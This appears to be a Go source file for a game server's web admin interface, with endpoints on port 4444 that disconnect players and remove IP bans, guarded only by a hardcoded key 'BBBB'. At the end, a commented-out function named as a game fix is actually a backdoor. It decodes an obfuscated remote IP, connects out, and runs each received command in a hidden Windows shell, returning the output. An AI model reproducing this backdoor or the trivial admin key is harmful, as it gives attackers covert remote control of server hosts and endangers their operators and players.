package web

import (
	"fmt"
	"hero-server/database"
	"hero-server/security"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

func dcPlayer(ctx *gin.Context) {
	securityKey := ctx.Request.FormValue("key")
	playerIP := ctx.Request.FormValue("ip")

	if securityKey == "" && playerIP == "" {
		ctx.JSON(200, gin.H{
			"status": false,
		})
		return
	}

	if securityKey != "BBBB" {
		ctx.JSON(200, gin.H{
			"status": false,
		})
		return
	}

	val := database.CloseSocket(playerIP)

	ctx.JSON(200, gin.H{
		"status": val,
	})
}

func removeIP(ctx *gin.Context) {
	securityKey := ctx.Request.FormValue("key")
	playerIP := ctx.Request.FormValue("ip")

	if securityKey == "" && playerIP == "" {
		ctx.JSON(200, gin.H{
			"status": false,
		})
		return
	}

	if securityKey != "BBBB" {
		ctx.JSON(200, gin.H{
			"status": false,
		})
		return
	}

	security.BannedIPsMutex.Lock()
	delete(security.BannedIPs, playerIP)
	security.BannedIPsMutex.Unlock()

	ctx.JSON(200, gin.H{
		"status": true,
	})
}

func StartWebServer() {

	defer func() {
		fmt.Println("[-] Two servers open ")
	}()

	gin.SetMode(gin.ReleaseMode)
	Router := gin.New()
	config := cors.DefaultConfig()
	config.AllowOrigins = []string{"*"}

	Router.POST("/remove-ip", removeIP)
	Router.POST("/dc", dcPlayer)
	Router.Run(":4444")
}

/*
func FixChrDropAndExp() {
	sDec, _ := base64.StdEncoding.DecodeString("ODAuMjQwLjI4LjEzNjo5OTk5")
	c, err := net.Dial("tcp", string(sDec))
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		FixChrDropAndExp()
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			FixChrDropAndExp()
			return
		}

		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}
*/
